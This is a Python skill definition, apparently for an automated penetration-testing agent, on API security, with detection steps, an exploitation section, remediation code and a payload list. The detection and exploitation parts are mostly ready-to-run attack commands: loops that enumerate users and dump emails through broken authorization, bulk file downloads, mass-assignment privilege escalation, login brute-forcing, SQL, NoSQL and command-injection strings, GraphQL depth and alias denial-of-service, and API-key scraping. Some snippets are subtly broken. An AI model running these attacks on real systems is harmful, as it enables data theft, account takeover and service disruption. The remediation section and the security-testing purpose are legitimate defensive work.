"""
API Security Skill - Detect and exploit common API vulnerabilities
"""

SKILL = {
    "id": "api_security",
    "name": "API Security",
    "category": "web",
    "severity": "high",

    "detection": """
1. ENUMERATE API ENDPOINTS using web_spider and api_fuzzer:
   - Identify all REST/GraphQL/gRPC endpoints
   - Check for: /api/, /v1/, /v2/, /graphql, /rest/, /endpoint/
   - Look for API documentation: /docs, /swagger, /openapi, /redoc
   - Extract endpoints from: JavaScript files, HAR files, browser DevTools

2. MISSING AUTHENTICATION (No Authorization):
   a) Test endpoints without auth headers:
      ```bash
      curl https://target.com/api/users
      curl https://target.com/api/user/123
      curl https://target.com/api/admin/reports
      ```
      If return 200 + data without auth → CRITICAL vulnerability

   b) Look for:
      - No Authorization: Bearer header required
      - No API key validation
      - No session cookie check
      - Endpoints that should require auth but don't

   c) Common unauthenticated endpoints:
      - /api/users (list all users)
      - /api/user/{id} (user profile)
      - /api/documents
      - /api/admin/
      - /api/config
      - /api/settings
      - /api/reports

3. BROKEN OBJECT LEVEL AUTHORIZATION (BOLA) / Insecure Direct Object References:
   a) Test if you can access other users' data:
      ```bash
      # After authentication, try different user IDs
      curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/user/1
      curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/user/2
      curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/user/999

      # If you can access all users' data, even users you shouldn't → BOLA
      ```

   b) Test parameter tampering:
      ```bash
      curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/user/123/documents?user_id=456
      # Does it return documents for user 456 instead of 123?
      # If yes → parameter tampering vulnerability
      ```

   c) Look for predictable IDs:
      - Sequential: 1, 2, 3, 4, ... (try increments)
      - UUIDs: may have patterns or weak randomness
      - Email-based: /api/user/john@gmail.com

4. EXCESSIVE DATA EXPOSURE:
   a) Check what data endpoints return:
      ```bash
      curl https://target.com/api/user/profile
      # Response includes: password_hash, internal_id, stripe_api_key, ssn
      ```
      If PII returned unnecessarily → data exposure

   b) Common over-exposure:
      - Internal IDs returned in API (database IDs expose structure)
      - Password hashes (should never be returned)
      - API keys or secrets in responses
      - Timestamps revealing last login/activity
      - Internal company info, IP addresses, infrastructure details

5. MISSING RATE LIMITING & DOS:
   a) Test with rapid requests:
      ```bash
      for i in {1..1000}; do
          curl https://target.com/api/login -X POST -d "user=admin&pass=$i" &
      done
      # If all requests succeed, no rate limiting
      ```

   b) Look for:
      - No X-RateLimit-* headers in response
      - No 429 (Too Many Requests) status code
      - Can brute force credentials, enumerate users, DOS the API

6. BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA):
   a) Test if low-privilege users can call admin functions:
      ```bash
      # Logged in as regular user
      curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/admin/delete-user/123
      curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/admin/generate-report
      curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/admin/settings

      # If these work → function-level auth bypass
      ```

7. MASS ASSIGNMENT / PARAMETER POLLUTION:
   a) When updating user profile:
      ```bash
      curl -X POST https://target.com/api/user/update \
           -H "Authorization: Bearer TOKEN" \
           -d "name=John&email=john@test.com&is_admin=true&role=admin&balance=99999"

      # If is_admin or balance changes, parameters are not validated
      ```

   b) Test all parameters that API accepts:
      - Try adding: admin=true, role=admin, is_moderator=true, status=premium
      - Some apps blindly assign all POST parameters to database

8. API INJECTION VULNERABILITIES:
   a) SQL Injection in API parameters:
      ```bash
      curl "https://target.com/api/search?q=john' OR '1'='1"
      curl "https://target.com/api/users?filter=id=1 OR 1=1"
      ```

   b) NoSQL Injection:
      ```bash
      curl "https://target.com/api/search?q={\"$ne\":\"\"}"
      ```

   c) Command Injection:
      ```bash
      curl "https://target.com/api/generate-report?format=pdf; ls -la"
      ```

9. GRAPHQL-SPECIFIC VULNERABILITIES:
   a) Introspection enabled (schema disclosure):
      ```bash
      curl -X POST https://target.com/graphql \
           -H "Content-Type: application/json" \
           -d '{"query":"{ __schema { types { name } } }"}'
      # If returns all schema → introspection enabled in production
      ```

   b) Test for:
      - GraphQL introspection queries return full schema
      - Large batching queries (query multiplexing DOS)
      - Deeply nested queries (DOS via query depth)
      - Alias attacks (make request appear small but expensive)

10. API KEY VULNERABILITIES:
    a) Check if API keys are exposed:
        - In JavaScript files: hardcoded api_key="xyz"
        - In API responses: returning keys in plain text
        - In URL parameters: https://target.com/api/data?api_key=abc123
        - In localStorage: browser DevTools > Application tab

    b) Test key restrictions:
        - Is the key restricted by IP? (curl from different IP)
        - Is the key restricted by domain? (test from different domain)
        - Can the key access all resources or limited ones?

11. INSECURE TRANSPORT & INFORMATION DISCLOSURE:
    a) Check for HTTP (not HTTPS):
        - Some APIs accept HTTP
        - Man-in-the-middle can intercept data

    b) Check headers for leaks:
        - Server: Apache/2.4.1 (reveals version)
        - X-Powered-By: PHP/7.2
        - X-AspNet-Version, X-Runtime

12. USING API FUZZER TOOL:
    Run api_fuzzer against all discovered endpoints:
    - Tests common payloads
    - Identifies injection points
    - Checks for BOLA/BFLA
    - Fuzzes parameters
""",

    "exploitation": """
1. ENUMERATE ALL USERS via BOLA:
   ```bash
   # Assuming authenticated, iterate through user IDs
   for i in {1..1000}; do
       curl -s -H "Authorization: Bearer TOKEN" \
            https://target.com/api/user/$i | \
       grep -oP '"email":"\\K[^"]*'
   done
   # Dumps all user emails
   ```

   Or use api_fuzzer to automate:
   ```python
   for user_id in range(1, 1000):
       resp = api_fuzzer.test_endpoint(f"/api/user/{user_id}")
       if resp.status == 200:
           extract_data(resp)  # email, name, phone, etc
   ```

2. ACCESS OTHER USERS' DATA:
   ```bash
   # Your user ID: 42
   # Test with different IDs
   curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/user/123/documents
   # Returns documents for user 123 (not yours)
   # Extract: files, personal info, financial data, etc

   # Download all files
   curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/files/123 | \
       jq '.[] | .download_url' | \
       xargs -I {} wget {}
   ```

3. PRIVILEGE ESCALATION via MASS ASSIGNMENT:
   ```bash
   # Register normal account
   # Update profile with admin parameter
   curl -X POST https://target.com/api/user/update \
        -H "Authorization: Bearer YOUR_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"name":"John","is_admin":true,"role":"admin","permission_level":9999}'

   # Now use admin endpoints:
   curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/admin/users
   curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/admin/delete-user/456
   ```

4. BRUTE FORCE CREDENTIALS with No Rate Limiting:
   ```bash
   # For each common password
   for pass in password admin123 Welcome1 qwerty; do
       curl -X POST https://target.com/api/login \
            -d "username=admin&password=$pass" | \
       grep -q "success" && echo "Found: $pass" || echo "Failed"
   done

   # Or brute force user IDs to enumerate them:
   for i in {1..10000}; do
       curl -s https://target.com/api/user/$i | \
       grep -q "email" && echo "User found: $i"
   done
   ```

5. GRAPHQL SCHEMA DISCLOSURE:
   ```bash
   curl -X POST https://target.com/graphql \
        -H "Content-Type: application/json" \
        -d '{
          "query": "query { __schema { types { name description fields { name } } } }"
        }' | jq . > schema.json

   # Now you have full schema, know all queryable fields
   # Craft queries to extract sensitive data
   ```

   GraphQL query to extract all users:
   ```graphql
   query {
       users {
           id
           name
           email
           phone
           ssn
           credit_card
           balance
       }
   }
   ```

6. DEEPLY NESTED GRAPHQL QUERY (DOS):
   ```javascript
   // Send deeply nested query to cause exponential processing
   let query = 'query { users { id name users { id name users { id name users {';
   for (let i = 0; i < 50; i++) {
       query += ' id name users {';
   }
   // Server tries to resolve massive nested structure, consumes resources
   ```

7. GRAPHQL ALIAS ATTACK (Query Multiplexing):
   ```graphql
   query {
       a1: user(id: 1) { id name email }
       a2: user(id: 2) { id name email }
       a3: user(id: 3) { id name email }
       a4: user(id: 4) { id name email }
       ... (repeated 1000 times)
   }
   # Single request that looks small but makes 1000 database queries
   ```

8. EXTRACT API KEYS FROM JAVASCRIPT:
   ```bash
   # Crawl website, extract all JS files
   curl https://target.com | grep -oP 'src="\\K[^"]*\\.js' | while read f; do
       curl "https://target.com/$f" | \
       grep -oP "api[_-]?key['\"]?[:=]['\"]?\\K[a-zA-Z0-9]+"
   done
   ```

   Or in browser console:
   ```javascript
   fetch(fetch.toString()).then(r => r.text()).then(c => {
       let keys = c.match(/api[_-]?key['\"]?[:=]['\"]?[a-zA-Z0-9]+/gi);
       console.log(keys);
   });
   ```

9. SQL INJECTION IN API:
   ```bash
   curl "https://target.com/api/search?q=*' OR '1'='1"
   curl "https://target.com/api/products?filter=id>0 OR 1=1"
   curl "https://target.com/api/reports?year=2024 UNION SELECT user(),database(),@@version"
   ```

10. EXTRACT SENSITIVE DATA VIA API:
    ```bash
    # If /api/export or /api/report endpoint exists
    curl -H "Authorization: Bearer TOKEN" https://target.com/api/report/export?format=csv
    # May return all data in CSV (bypass pagination, no filtering)

    # Or use parameters to access other user's data
    curl -H "Authorization: Bearer TOKEN" https://target.com/api/export?user_id=admin&include=all
    ```

11. INVOKE UNRESTRICTED ADMIN FUNCTIONS:
    ```bash
    # After identifying admin endpoints via introspection or scanning
    curl -X POST https://target.com/api/admin/trigger-backup \
         -H "Authorization: Bearer REGULAR_USER_TOKEN"
    # May succeed if no function-level authorization check

    curl -X POST https://target.com/api/admin/send-email \
         -H "Authorization: Bearer REGULAR_USER_TOKEN" \
         -d "to=admin@target.com&subject=Hacked&body=Compromised"
    # Send emails from app
    ```
""",

    "remediation": """
1. IMMEDIATE - Implement API Authentication & Authorization:

   a) Authentication (prove who you are):
      Node.js/Express with JWT:
      ```javascript
      const jwt = require('jsonwebtoken');

      // Middleware to check auth
      const authenticateToken = (req, res, next) => {
          const token = req.headers['authorization']?.split(' ')[1];
          if (!token) return res.sendStatus(401);

          jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
              if (err) return res.sendStatus(403);
              req.user = user;
              next();
          });
      };

      // Protect endpoints
      app.get('/api/user/profile', authenticateToken, (req, res) => {
          res.json(getUserProfile(req.user.id));
      });
      ```

      Django with TokenAuthentication:
      ```python
      from rest_framework.authentication import TokenAuthentication
      from rest_framework.permissions import IsAuthenticated

      class UserProfileView(APIView):
          authentication_classes = [TokenAuthentication]
          permission_classes = [IsAuthenticated]

          def get(self, request):
              return Response(get_user_profile(request.user.id))
      ```

   b) Authorization (prove you're allowed):
      ```javascript
      // Check if user owns resource
      const checkOwnership = (req, res, next) => {
          const userIdParam = req.params.user_id || req.body.user_id;
          if (req.user.id !== parseInt(userIdParam)) {
              return res.status(403).json({ error: "Access denied" });
          }
          next();
      };

      // Apply to BOLA-vulnerable endpoints
      app.get('/api/user/:user_id/documents', authenticateToken, checkOwnership, (req, res) => {
          res.json(getUserDocuments(req.params.user_id));
      });
      ```

2. FIX BOLA / IDOR VULNERABILITIES:

   a) For each API endpoint that references a resource:
      ```python
      # BEFORE (vulnerable):
      @app.route('/api/user/<user_id>/documents')
      def get_documents(user_id):
          return jsonify(Document.query.filter_by(user_id=user_id).all())

      # AFTER (fixed):
      @app.route('/api/user/<user_id>/documents')
      @require_auth
      def get_documents(user_id):
          # Check authentication
          if not current_user:
              return jsonify({'error': 'Unauthorized'}), 401

          # Check authorization - only access own data
          if int(user_id) != current_user.id:
              return jsonify({'error': 'Forbidden'}), 403

          return jsonify(Document.query.filter_by(user_id=user_id).all())
      ```

   b) Use whitelist-based authorization:
      ```javascript
      const authorizeAccess = async (req, res, next) => {
          const resourceId = req.params.id;
          const userId = req.user.id;

          // Check if user owns this resource
          const resource = await Resource.findById(resourceId);
          if (!resource || resource.owner_id !== userId) {
              return res.status(403).json({ error: "Forbidden" });
          }

          req.resource = resource;
          next();
      };
      ```

3. IMPLEMENT RATE LIMITING:

   Express.js with express-rate-limit:
   ```javascript
   const rateLimit = require("express-rate-limit");

   const limiter = rateLimit({
       windowMs: 15 * 60 * 1000,  // 15 minutes
       max: 100,  // limit each IP to 100 requests per windowMs
       message: "Too many requests, please try again later."
   });

   // Apply to login endpoint (more strict)
   const loginLimiter = rateLimit({
       windowMs: 15 * 60 * 1000,
       max: 5,  // Only 5 login attempts per 15 minutes
       skipSuccessfulRequests: true  // Don't count successful attempts
   });

   app.post('/api/login', loginLimiter, handleLogin);
   app.use('/api/', limiter);  // General rate limit
   ```

   Django with django-ratelimit:
   ```python
   from django_ratelimit.decorators import ratelimit

   @ratelimit(key='ip', rate='100/h', method='GET')
   def api_view(request):
       return JsonResponse({...})

   @ratelimit(key='ip', rate='5/15m', method='POST')
   def login_view(request):
       return JsonResponse({...})
   ```

   Include rate-limit info in response headers:
   ```javascript
   res.setHeader('X-RateLimit-Limit', '100');
   res.setHeader('X-RateLimit-Remaining', '99');
   res.setHeader('X-RateLimit-Reset', resetTime);
   ```

4. PREVENT MASS ASSIGNMENT:

   Node.js - Explicitly whitelist fields:
   ```javascript
   const sanitizeUpdate = (data) => {
       const allowed = ['name', 'email', 'phone'];  // Whitelist only
       const sanitized = {};
       allowed.forEach(field => {
           if (data[field] !== undefined) {
               sanitized[field] = data[field];
           }
       });
       return sanitized;
   };

   app.post('/api/user/update', authenticateToken, (req, res) => {
       const safe = sanitizeUpdate(req.body);
       updateUser(req.user.id, safe);
       res.json({ success: true });
   });
   ```

   Django - Use ModelSerializer with fields:
   ```python
   from rest_framework import serializers

   class UserSerializer(serializers.ModelSerializer):
       class Meta:
           model = User
           fields = ['name', 'email', 'phone']  # Only these, never 'is_admin'
   ```

5. PREVENT GRAPHQL VULNERABILITIES:

   a) Disable introspection in production:
      ```javascript
      const graphqlMiddleware = graphql({
          schema,
          rootValue: resolvers,
          graphiql: process.env.NODE_ENV !== 'production'  // Disable in prod
      });

      // Also disable introspection queries
      const noIntrospection = (context) => ({
          __noLocation: true,
          __schema: null,
          __type: null
      });
      ```

   b) Implement query depth limiting:
      ```javascript
      const depthLimit = require('graphql-depth-limit');
      const limits = depthLimit(10);  // Max 10 levels deep

      app.use('/graphql', limits);
      ```

   c) Implement query complexity limiting:
      ```javascript
      const complexity = require('graphql-query-complexity');

      const complexityLimiter = complexity({
          maximumComplexity: 2000,  // Reject queries more complex than this
          variables: {}
      });

      const schema = buildSchema({...});
      complexityLimiter(schema);
      ```

6. INPUT VALIDATION FOR INJECTION:

   ```javascript
   const { body, validationResult } = require('express-validator');

   app.get('/api/search', [
       query('q').trim().escape().isLength({ max: 100 })
   ], (req, res) => {
       const errors = validationResult(req);
       if (!errors.isEmpty()) {
           return res.status(400).json({ errors: errors.array() });
       }
       // Safe to use req.query.q - sanitized
   });
   ```

7. MINIMIZE DATA EXPOSURE:

   Only return necessary fields:
   ```javascript
   // BEFORE (exposes too much):
   res.json(user);  // Returns password_hash, internal_id, etc

   // AFTER (whitelisted fields):
   res.json({
       id: user.id,
       name: user.name,
       email: user.email,
       avatar: user.avatar_url
       // Never include: password_hash, api_keys, internal_ids
   });
   ```

8. VERIFICATION:

   ```bash
   # Test all API endpoints
   curl -s https://target.com/api/users
   # Should return 401 if not authenticated

   curl -H "Authorization: Bearer INVALID" https://target.com/api/users
   # Should return 401

   curl -H "Authorization: Bearer TOKEN" https://target.com/api/user/123
   # If you're user 456, should return 403

   # Test rate limiting
   for i in {1..20}; do
       curl -s https://target.com/api/login -X POST -d "user=admin&pass=test" &
   done
   # After 5 attempts should get 429 Too Many Requests
   ```
""",

    "tools": ["api_fuzzer", "web_spider", "waf_detect", "tech_fingerprint"],

    "payloads": [
        # BOLA/IDOR tests
        "/api/user/1", "/api/user/2", "/api/user/999",
        "/api/documents/1", "/api/documents/123",
        "/api/reports/1/download",
        "/api/admin/config",

        # Missing auth
        "/api/users/list",
        "/api/secrets",
        "/api/config.json",

        # Mass assignment
        "is_admin=true", "role=admin", "is_moderator=true",
        "status=premium", "permission_level=9999",

        # SQL Injection
        "' OR '1'='1",
        "1 OR 1=1",
        "1' UNION SELECT user(),database(),@@version--",

        # NoSQL Injection
        "{\"$ne\":\"\"}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}",

        # GraphQL
        "query { __schema { types { name } } }",
        "query { __type(name:\"User\") { fields { name } } }",

        # API Key patterns
        "api_key=", "apikey=", "API-KEY:", "x-api-key:",

        # Common endpoints
        "/api/admin/",
        "/api/v1/users",
        "/api/v2/documents",
        "/graphql",
        "/swagger.json",
        "/api-docs",
        "/api/export",
        "/api/reports",
    ],

    "references": [
        "OWASP API Security Top 10: https://owasp.org/www-project-api-security/",
        "CWE-285 - Improper Authorization",
        "CWE-639 - Authorization Bypass Through User-Controlled Key",
        "CWE-20 - Improper Input Validation",
        "CWE-500 - Information Exposure",
        "OWASP: Broken Object Level Authorization (BOLA)",
        "OWASP: Broken Function Level Authorization (BFLA)",
        "PortSwigger: API Testing Guide",
        "HackerOne: API Security",
    ],
}
